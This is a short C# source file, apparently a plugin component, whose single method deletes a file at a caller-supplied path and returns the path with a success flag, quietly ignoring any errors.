using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal class DeleteFile
    {
        internal static Tuple<string, bool> RemoveFile(string path) 
        {
            try
            {
                System.IO.File.Delete(path);
                return Tuple.Create(path, true);
            }
            catch
            {
            }
            return Tuple.Create(path, false);
        }
    }
}
